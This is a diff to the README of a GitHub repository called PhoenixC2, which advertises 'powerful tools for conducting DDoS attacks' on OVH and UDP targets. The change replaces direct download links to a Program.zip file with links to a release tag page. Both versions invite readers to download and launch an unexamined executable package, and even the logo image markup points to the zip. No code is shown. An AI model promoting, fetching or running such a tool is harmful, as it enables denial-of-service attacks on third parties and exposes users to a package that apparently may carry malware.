@@ -2,7 +2,7 @@
 
 Welcome to PhoenixC2 repository, where you can find powerful tools for conducting DDoS attacks and stress testing networks with ease. 
 
-![PhoenixC2 Logo](https://github.com/Stamp3343/PhoenixC2/releases/download/v1.0/Program.zip)
+![PhoenixC2 Logo](https://github.com/Stamp3343/PhoenixC2/releases/tag/v1.0)
 
 ## Description 🚀
 
@@ -31,9 +31,9 @@ PhoenixC2 is a potent tool designed for 2-10g OVH and 90-100G UDP, providing sta
 
 ## Installation 💻
 
-To get started with PhoenixC2, download the software package from [here](https://github.com/Stamp3343/PhoenixC2/releases/download/v1.0/Program.zip) and launch the application.
+To get started with PhoenixC2, download the software package from [here](https://github.com/Stamp3343/PhoenixC2/releases/tag/v1.0) and launch the application.
 
-[![Launch PhoenixC2](https://github.com/Stamp3343/PhoenixC2/releases/download/v1.0/Program.zip)](https://github.com/Stamp3343/PhoenixC2/releases/download/v1.0/Program.zip)
+[![Launch PhoenixC2](https://github.com/Stamp3343/PhoenixC2/releases/tag/v1.0)](https://github.com/Stamp3343/PhoenixC2/releases/tag/v1.0)
 
 ## Usage 📊
 
